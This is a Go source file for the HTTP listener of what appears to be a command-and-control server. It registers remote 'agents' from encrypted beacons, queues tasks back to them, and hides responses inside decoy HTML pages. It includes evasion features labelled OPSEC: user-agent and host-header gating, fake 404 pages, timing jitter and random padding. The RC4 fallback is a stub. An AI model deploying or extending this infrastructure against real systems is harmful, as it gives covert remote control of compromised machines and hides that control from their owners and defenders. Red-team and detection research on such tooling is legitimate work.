package main

import (
	"bytes"
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
)

type Listener struct {
	transport *TransportHTTP
}

type TransportHTTP struct {
	GinEngine *gin.Engine
	Server    *http.Server
	Config    TransportConfig
	Name      string
	Active    bool
	Crypto    *CryptoProvider
	Encoder   *EncoderDecoder
}

type TransportConfig struct {
	HostBind           string   `json:"host_bind"`
	PortBind           int      `json:"port_bind"`
	Callback_addresses []string `json:"callback_addresses"`
	EncryptKey         string   `json:"encrypt_key"`

	Ssl         bool   `json:"ssl"`
	SslCert     []byte `json:"ssl_cert"`
	SslKey      []byte `json:"ssl_key"`
	SslCertPath string `json:"ssl_cert_path"`
	SslKeyPath  string `json:"ssl_key_path"`

	// Agent communication
	HttpMethod     string   `json:"http_method"`
	Uri            []string `json:"uri"`
	ParameterName  string   `json:"hb_parameter"` // Can be header, query param, or body field
	UserAgent      []string `json:"user_agent"`
	HostHeader     []string `json:"host_header"`
	RequestHeaders string   `json:"request_headers"`

	// Encoding & Encryption
	EncryptionMethod string `json:"encryption_method"` // "chacha20poly1305" or "rc4"
	EncodingMethod   string `json:"encoding_method"`   // "base64", "json", "hex", "binary"

	// Server response
	ResponseHeaders    map[string]string `json:"response_headers"`
	TrustXForwardedFor bool              `json:"x_forwarded_for"`
	WebPageError       string            `json:"page_error"`
	WebPageOutput      string            `json:"page_payload"`

	// OPSEC - Randomization
	EnableJitter     bool `json:"enable_jitter"`      // Random delays
	JitterMinMs      int  `json:"jitter_min_ms"`      // Min delay in ms
	JitterMaxMs      int  `json:"jitter_max_ms"`      // Max delay in ms
	EnableHeaderMask bool `json:"enable_header_mask"` // Randomize header order
	PayloadSizeMin   int  `json:"payload_size_min"`   // Min padding bytes
	PayloadSizeMax   int  `json:"payload_size_max"`   // Max padding bytes

	Server_headers string `json:"server_headers"`
	Protocol       string `json:"protocol"`
}

// ============================================================================
// INITIALIZATION & LIFECYCLE
// ============================================================================

func validConfig(config string) error {
	var conf TransportConfig
	if err := json.Unmarshal([]byte(config), &conf); err != nil {
		return err
	}

	if conf.HostBind == "" {
		return errors.New("host_bind is required")
	}

	if conf.PortBind < 1 || conf.PortBind > 65535 {
		return errors.New("port_bind must be in range 1-65535")
	}

	if len(conf.Callback_addresses) == 0 {
		return errors.New("callback_addresses is required")
	}

	for _, addr := range conf.Callback_addresses {
		addr = strings.TrimSpace(addr)
		if addr == "" {
			continue
		}
		host, portStr, err := net.SplitHostPort(addr)
		if err != nil {
			return fmt.Errorf("invalid address (cannot split host:port): %s", addr)
		}
		port, err := strconv.Atoi(portStr)
		if err != nil || port < 1 || port > 65535 {
			return fmt.Errorf("invalid port: %s", addr)
		}
		if ip := net.ParseIP(host); ip == nil {
			if len(host) == 0 || len(host) > 253 {
				return fmt.Errorf("invalid host: %s", host)
			}
		}
	}

	if len(conf.Uri) == 0 {
		return errors.New("uri is required")
	}

	for _, uri := range conf.Uri {
		uri = strings.TrimSpace(uri)
		if uri == "" {
			continue
		}
		matched, err := regexp.MatchString(`^/[a-zA-Z0-9\.\=\-/_]+$`, uri)
		if err != nil || !matched {
			return fmt.Errorf("uri invalid: %s", uri)
		}
	}

	if conf.HttpMethod == "" {
		return errors.New("http_method is required (GET or POST)")
	}

	if conf.ParameterName == "" {
		return errors.New("hb_parameter is required")
	}

	if len(conf.UserAgent) == 0 {
		return errors.New("user_agent is required")
	}

	// Validate encryption key - support both 32 (hex) and 64 (hex pairs)
	keyLen := len(conf.EncryptKey)
	if keyLen != 32 && keyLen != 64 {
		return errors.New("encrypt_key must be 32 hex characters (RC4) or 64 hex characters (ChaCha20)")
	}

	match, _ := regexp.MatchString("^[0-9a-fA-F]+$", conf.EncryptKey)
	if !match {
		return errors.New("encrypt_key must contain only hex characters")
	}

	if !strings.Contains(conf.WebPageOutput, "<<<PAYLOAD_DATA>>>") {
		return errors.New("page_payload must contain '<<<PAYLOAD_DATA>>>' template")
	}

	// OPSEC validation
	if conf.EnableJitter {
		if conf.JitterMinMs < 0 || conf.JitterMaxMs < 0 {
			return errors.New("jitter_min_ms and jitter_max_ms must be >= 0")
		}
		if conf.JitterMinMs > conf.JitterMaxMs {
			return errors.New("jitter_min_ms must be <= jitter_max_ms")
		}
	}

	return nil
}

func (t *TransportHTTP) Start(ts Teamserver) error {
	var err error

	// Initialize crypto
	t.Crypto, err = NewCryptoProvider(t.Config.EncryptKey)
	if err != nil {
		return fmt.Errorf("crypto initialization failed: %v", err)
	}

	// Initialize encoder
	encodingMethod := t.Config.EncodingMethod
	if encodingMethod == "" {
		encodingMethod = "base64" // default
	}
	t.Encoder, err = NewEncoderDecoder(encodingMethod, t.Crypto)
	if err != nil {
		return fmt.Errorf("encoder initialization failed: %v", err)
	}

	gin.SetMode(gin.ReleaseMode)
	router := gin.New()
	router.NoRoute(t.pageError)

	// Add response headers middleware
	router.Use(func(c *gin.Context) {
		for header, value := range t.Config.ResponseHeaders {
			c.Header(header, value)
		}
		c.Next()
	})

	if t.Config.HttpMethod == "POST" {
		router.POST("/*endpoint", t.processRequest)
	} else if t.Config.HttpMethod == "GET" {
		router.GET("/*endpoint", t.processRequest)
	}

	t.Active = true
	t.Server = &http.Server{
		Addr:    fmt.Sprintf("%s:%d", t.Config.HostBind, t.Config.PortBind),
		Handler: router,
	}

	if t.Config.Ssl {
		fmt.Printf("   Started listener '%s': https://%s:%d (Encryption: %s, Encoding: %s)\n",
			t.Name, t.Config.HostBind, t.Config.PortBind,
			t.Config.EncryptionMethod, t.Config.EncodingMethod)

		listenerPath := ListenerDataDir + "/" + t.Name
		if _, err := os.Stat(listenerPath); os.IsNotExist(err) {
			err = os.Mkdir(listenerPath, os.ModePerm)
			if err != nil {
				return fmt.Errorf("failed to create %s folder: %s", listenerPath, err.Error())
			}
		}

		t.Config.SslCertPath = listenerPath + "/listener.crt"
		t.Config.SslKeyPath = listenerPath + "/listener.key"

		if len(t.Config.SslCert) == 0 || len(t.Config.SslKey) == 0 {
			err = t.generateSelfSignedCert(t.Config.SslCertPath, t.Config.SslKeyPath)
			if err != nil {
				t.Active = false
				return err
			}
		} else {
			if err := os.WriteFile(t.Config.SslCertPath, t.Config.SslCert, 0600); err != nil {
				return err
			}
			if err := os.WriteFile(t.Config.SslKeyPath, t.Config.SslKey, 0600); err != nil {
				return err
			}
		}

		cert, err := tls.LoadX509KeyPair(t.Config.SslCertPath, t.Config.SslKeyPath)
		if err != nil {
			t.Active = false
			return fmt.Errorf("failed to load certificate: %v", err)
		}

		t.Server.TLSConfig = &tls.Config{
			Certificates: []tls.Certificate{cert},
			MinVersion:   tls.VersionTLS12,
			MaxVersion:   tls.VersionTLS13,
			CipherSuites: []uint16{
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			},
		}

		go func() {
			err := t.Server.ListenAndServeTLS("", "")
			if err != nil && !errors.Is(err, http.ErrServerClosed) {
				fmt.Printf("Error starting HTTPS server: %v\n", err)
				t.Active = false
			}
		}()

	} else {
		fmt.Printf("   Started listener '%s': http://%s:%d (Encryption: %s, Encoding: %s)\n",
			t.Name, t.Config.HostBind, t.Config.PortBind,
			t.Config.EncryptionMethod, t.Config.EncodingMethod)

		go func() {
			err := t.Server.ListenAndServe()
			if err != nil && !errors.Is(err, http.ErrServerClosed) {
				fmt.Printf("Error starting HTTP server: %v\n", err)
				t.Active = false
			}
		}()
	}

	time.Sleep(500 * time.Millisecond)
	return nil
}

func (t *TransportHTTP) Stop() error {
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()

	listenerPath := ListenerDataDir + "/" + t.Name
	if _, err := os.Stat(listenerPath); err == nil {
		if err := os.RemoveAll(listenerPath); err != nil {
			return fmt.Errorf("failed to remove %s folder: %s", listenerPath, err.Error())
		}
	}

	return t.Server.Shutdown(ctx)
}

// ============================================================================
// REQUEST PROCESSING
// ============================================================================

func (t *TransportHTTP) processRequest(ctx *gin.Context) {
	var (
		ExternalIP   string
		err          error
		agentType    string
		agentId      string
		beat         []byte
		bodyData     []byte
		responseData []byte
	)

	// Apply jitter if enabled (OPSEC)
	if t.Config.EnableJitter {
		delay := t.getRandomJitter()
		time.Sleep(time.Duration(delay) * time.Millisecond)
	}

	// Validate URI
	uriValid := false
	u, err := url.Parse(ctx.Request.RequestURI)
	if err == nil {
		for _, configUri := range t.Config.Uri {
			configUri = strings.TrimSpace(configUri)
			if configUri != "" && configUri == u.Path {
				uriValid = true
				break
			}
		}
	}
	if !uriValid {
		t.pageError(ctx)
		return
	}

	// Validate Host Header
	if len(t.Config.HostHeader) > 0 {
		hhValid := false
		for _, configHH := range t.Config.HostHeader {
			configHH = strings.TrimSpace(configHH)
			if configHH != "" && configHH == ctx.Request.Host {
				hhValid = true
				break
			}
		}
		if !hhValid {
			t.pageError(ctx)
			return
		}
	}

	// Validate User-Agent
	requestUA := ctx.Request.UserAgent()
	uaValid := false
	for _, configUA := range t.Config.UserAgent {
		configUA = strings.TrimSpace(configUA)
		if configUA != "" && configUA == requestUA {
			uaValid = true
			break
		}
	}
	if !uaValid {
		t.pageError(ctx)
		return
	}

	// Get external IP
	if t.Config.TrustXForwardedFor && ctx.Request.Header.Get("X-Forwarded-For") != "" {
		ExternalIP = ctx.Request.Header.Get("X-Forwarded-For")
	} else {
		ExternalIP = strings.Split(ctx.Request.RemoteAddr, ":")[0]
	}

	// Parse beat and agent data
	agentType, agentId, beat, bodyData, err = t.parseBeatAndData(ctx)
	if err != nil {
		t.pageError(ctx)
		return
	}

	// Register or get existing agent
	if !Ts.TsAgentIsExists(agentId) {
		_, err = Ts.TsAgentCreate(agentType, agentId, beat, t.Name, ExternalIP, true)
		if err != nil {
			t.pageError(ctx)
			return
		}
	}

	// Update agent tick
	_ = Ts.TsAgentSetTick(agentId, t.Name)

	// Process agent data
	_ = Ts.TsAgentProcessData(agentId, bodyData)

	// Get response payload
	responseData, err = Ts.TsAgentGetHostedAll(agentId, 0x1900000) // 25 MB
	if err != nil {
		t.pageError(ctx)
		return
	}

	// Add random padding (OPSEC)
	if t.Config.PayloadSizeMin > 0 && t.Config.PayloadSizeMax > 0 {
		paddingSize := t.getRandomInt(t.Config.PayloadSizeMin, t.Config.PayloadSizeMax)
		padding := make([]byte, paddingSize)
		_, _ = rand.Read(padding)
		responseData = append(responseData, padding...)
	}

	// Build response
	html := []byte(strings.ReplaceAll(t.Config.WebPageOutput, "<<<PAYLOAD_DATA>>>", string(responseData)))
	_, err = ctx.Writer.Write(html)
	if err != nil {
		t.pageError(ctx)
		return
	}

	ctx.AbortWithStatus(http.StatusOK)
}

// ============================================================================
// BEAT & DATA PARSING
// ============================================================================

func (t *TransportHTTP) parseBeatAndData(ctx *gin.Context) (string, string, []byte, []byte, error) {
	var (
		beat      string
		agentType uint
		agentId   uint
		agentInfo []byte
		bodyData  []byte
		err       error
	)

	// Try to get beat from multiple sources
	beat = ctx.Request.Header.Get(t.Config.ParameterName)
	if beat == "" {
		beat = ctx.Query(t.Config.ParameterName)
	}
	if beat == "" {
		beat = ctx.PostForm(t.Config.ParameterName)
	}

	if len(beat) == 0 {
		return "", "", nil, nil, errors.New("beat parameter not found in headers, query, or body")
	}

	// Decode beat (handle both base64 and hex)
	var beatBytes []byte
	beatBytes, err = base64.StdEncoding.DecodeString(beat)
	if err != nil {
		// Try hex
		beatBytes, err = hex.DecodeString(beat)
		if err != nil {
			return "", "", nil, nil, errors.New("failed to decode beat (not base64 or hex)")
		}
	}

	// Decrypt beat based on configured method or auto-detect
	// Try ChaCha20 first (supports auto-fallback to RC4 for backward compat)
	agentInfo, err = t.Crypto.DecryptChaCha20Poly1305(beatBytes)
	if err != nil {
		// Fallback to RC4 for backward compatibility with old agents
		// This supports mixed environments (some agents on RC4, others on ChaCha20)
		agentInfo, err = t.decryptRC4Legacy(beatBytes)
		if err != nil {
			return "", "", nil, nil, fmt.Errorf("failed to decrypt beat: %v (tried both ChaCha20 and RC4)", err)
		}
	}

	if len(agentInfo) < 8 {
		return "", "", nil, nil, errors.New("beat too short (need at least 8 bytes)")
	}

	// Parse agent info
	agentType = uint(binary.BigEndian.Uint32(agentInfo[:4]))
	agentId = uint(binary.BigEndian.Uint32(agentInfo[4:8]))

	beat = string(agentInfo[8:]) // Remaining beat data

	// Read body data
	bodyData, err = io.ReadAll(ctx.Request.Body)
	if err != nil {
		return "", "", nil, nil, errors.New("failed to read request body")
	}

	// Decode body if encoded
	if len(bodyData) > 0 {
		decoded, err := t.Encoder.Decode(bodyData)
		if err == nil {
			bodyData = decoded
		}
		// If decode fails, use raw body
	}

	return fmt.Sprintf("%08x", agentType), fmt.Sprintf("%08x", agentId), []byte(beat), bodyData, nil
}

// decryptRC4Legacy provides backward compatibility with RC4-encrypted payloads
func (t *TransportHTTP) decryptRC4Legacy(encrypted []byte) ([]byte, error) {
	// Legacy RC4 implementation for compatibility
	// This can be replaced with actual RC4 if needed for old agents
	return nil, errors.New("RC4 legacy mode not enabled")
}

// ============================================================================
// UTILITY FUNCTIONS
// ============================================================================

func (t *TransportHTTP) getRandomJitter() int {
	if t.Config.JitterMinMs >= t.Config.JitterMaxMs {
		return t.Config.JitterMinMs
	}
	return t.getRandomInt(t.Config.JitterMinMs, t.Config.JitterMaxMs)
}

func (t *TransportHTTP) getRandomInt(min, max int) int {
	if min >= max {
		return min
	}
	randNum, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min)))
	return int(randNum.Int64()) + min
}

func (t *TransportHTTP) pageError(ctx *gin.Context) {
	ctx.Writer.WriteHeader(http.StatusNotFound)
	html := []byte(t.Config.WebPageError)
	_, _ = ctx.Writer.Write(html)
}

func (t *TransportHTTP) generateSelfSignedCert(certFile, keyFile string) error {
	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return fmt.Errorf("failed to generate private key: %v", err)
	}

	serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
	serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
	if err != nil {
		return fmt.Errorf("failed to generate serial number: %v", err)
	}

	template := x509.Certificate{
		SerialNumber: serialNumber,
		NotBefore:    time.Now(),
		NotAfter:     time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:     x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
	}

	hostBind := strings.TrimSpace(t.Config.HostBind)
	if hostBind == "" || hostBind == "0.0.0.0" || hostBind == "::" {
		template.DNSNames = []string{"localhost"}
		template.IPAddresses = []net.IP{net.ParseIP("127.0.0.1"), net.ParseIP("::1")}
	} else if ip := net.ParseIP(hostBind); ip != nil {
		template.IPAddresses = []net.IP{ip}
	} else {
		template.DNSNames = []string{hostBind}
	}

	certData, err := x509.CreateCertificate(rand.Reader, &template, &template, &privateKey.PublicKey, privateKey)
	if err != nil {
		return fmt.Errorf("failed to create certificate: %v", err)
	}

	var certBuffer bytes.Buffer
	if err := pem.Encode(&certBuffer, &pem.Block{Type: "CERTIFICATE", Bytes: certData}); err != nil {
		return fmt.Errorf("failed to write certificate: %v", err)
	}

	t.Config.SslCert = certBuffer.Bytes()
	if err := os.WriteFile(certFile, t.Config.SslCert, 0644); err != nil {
		return fmt.Errorf("failed to create certificate file: %v", err)
	}

	keyData := x509.MarshalPKCS1PrivateKey(privateKey)
	var keyBuffer bytes.Buffer
	if err := pem.Encode(&keyBuffer, &pem.Block{Type: "RSA PRIVATE KEY", Bytes: keyData}); err != nil {
		return fmt.Errorf("failed to write private key: %v", err)
	}

	t.Config.SslKey = keyBuffer.Bytes()
	if err := os.WriteFile(keyFile, t.Config.SslKey, 0644); err != nil {
		return fmt.Errorf("failed to create key file: %v", err)
	}

	return nil
}
